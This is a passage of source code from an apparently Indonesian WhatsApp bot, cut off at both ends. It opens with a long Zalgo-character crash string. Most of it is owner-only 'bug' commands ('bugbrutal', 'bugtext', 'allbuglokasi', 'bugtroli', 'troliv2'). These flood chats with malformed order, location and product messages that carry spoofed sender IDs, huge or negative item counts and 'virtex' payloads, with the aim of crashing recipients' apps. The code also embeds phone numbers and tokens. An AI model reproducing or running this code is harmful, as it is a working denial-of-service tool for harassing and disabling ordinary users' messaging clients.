̨͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡',                      
                          jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 99999999, // Bug
    status: 1,
    surface: 1,
    message: 'ʀᴀɴᴢ',
    orderTitle: 'fuck', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
await kurzxd.toggleDisappearingMessages(from,`MODAR`,text)	    
		       break
		       //ini Gua enc karena masih privat punya hw mods
        case 'bugbrutal':
if (!kurz.key.fromMe && !isOwner) return
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.sendMessage(from, 'ɢᴇᴍ⸙', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: 'ʀᴀɴᴢ',
    orderTitle: 'kurzxd', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugv2':
if (!kurz.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
}
reply('Sukses Send Bug Sebanyak '+args.join(' '))
					break
        case 'bugstik':
        if (!kurz.key.fromMe && !isOwner) return
        kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                 const ara = fs.readFileSync('./lib/bug.webp');
                  kurzxd.sendMessage(from, ara, MessageType.sticker, {quoted: {key: {participant: '0@s.whatsapp.net' },message: {orderMessage: {itemCount: 999999999,status: 1,surface: 1,message: 'ꪶ𖣂ꫂkurzxd',orderTitle: 'FAKE-BOT',sellerJid: '0@s.whatsapp.net'}}}})                  
        break
        case 'bugtext':
if (!kurz.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${NamaBot}`
		        var grousp = await kurzxd.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: kurz
                }
		        for (let i = 0; i < args[0]; i++) {
		        kurzxd.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6285339388512@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${namabot}`,
						"orderTitle": `${namaowner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        kurzxd.sendMessage(from, `${namabot}`, MessageType.extendedText, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6285339388512@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${namabot}`,
						"orderTitle": `${namaowner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'jadicv5':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await kurzxd.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "thumbnail": virgam,
             "title": `${q}                                 ${spamvirtex}`,
             "description": `${desk}`,
             "retailerId": "kurzxd",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: kurz, contextInfo:{}})
   kurzxd.relayWAMessage(res)
}
break
case 'jadicv4':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await kurzxd.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "thumbnail": virgam,
             "title": `${q} ${jadivirtex1}`,
             "description": `${jadivirtex1} ${virtexctlgg} `,
             "retailerId": "kurzxd",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: kurz, contextInfo:{}})
   kurzxd.relayWAMessage(res)
}
break
		       case 'allbuglokasi':
       if (!kurz.key.fromMe && !isOwner) return
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥kurzxd',
						address: `${virtex8(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'kurzxd',
    orderTitle: 'b', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥kurzxd',
						address: `${virtex9(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'kurzxd',
    orderTitle: 'b', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥kurzxd ',
						address: `${virtex2(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'kurzxd̷',
    orderTitle: 'c', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥kurzxd',
						address: `${virtex7(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'kurzxd̷',
    orderTitle: 'd', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥kurzxd ',
						address: `${virtex5(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'kurzxd',
    orderTitle: 'e', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: 'kurzxd',
						address: `${virtex4(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'kurzxd̷',
    orderTitle: 'f', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥ʀᴀɴᴢ々ɢᴇᴍ',
						address: `${virtex3(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'kurzxd̷',
    orderTitle: 'g', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥ʀᴀɴᴢ々ɢᴇᴍ',
						address: `${virtex(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'ʀᴀɴᴢ̷',
    orderTitle: 'h', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./lib/bug.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: 'ʀᴀɴᴢ',
						address: `${ngazap(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'kurzxd',
    orderTitle: 'Z', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
 case 'bugtroli':
		    if (!kurz.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
kurzxd.sendMessage(from,`▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\x0a▒▒█▒▒▒▄██████████▄▒▒▒▒\x0a▒█▐▒▒▒████████████▒▒▒▒\x0a▒▌▐▒▒██▄▀██████▀▄██▒▒▒\x0a▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\x0a▐┼▐▒▒██████████████▒▒▒\x0a▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\x0a▒▒█████──────────▐███▌\x0a▒▒█▀▀██▄█─▄───▐─▄███▀▒\x0a▒▒█▒▒███████▄██████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒█████████▐▌██▌▒▒▒\x0a▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: -969769349,
status: 1,
surface: 10,
message: '🔥ʀᴀɴᴢ々ɢᴇᴍ̷',
orderTitle: `🔥ʙᴏᴛᴢ🔥`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
await kurzxd.toggleDisappearingMessages(from)
await kurzxd.toggleDisappearingMessages(from)
break
case 'troliv2':
if (!kurz.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
				 kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
				 kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
 hmm4 = fs.readFileSync(`./lib/logo.jpg`)
imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
                      res = await kurzxd.prepareMessageFromContent(from, {
                           "orderMessage": {
                               "orderId": "3184312811796096",
                               "sellerJid": "6285714170944@s.whatsapp.net",
                               "itemCount": 2021,
                               "status": "INQUIRY",
                               "thumbnail": fs.readFileSync('./lib/logo.jpg'),
                               "surface": "CATALOG",
                               "jpegThumbnail": fs.readFileSync('./lib/logo.jpg'),
                               "message": `${virtex2(prefix)}`,
                               "orderTitle": "9999999999999",
                                "token": "AR72qWd0CaoPN/e5maiyQRxx+gykcW/JH8LXwoJVcQsVgg==",
                                "totalAmount1000": "999999999999999999999999999",
                               "totalCurrencyCode": "IDR",
                                }
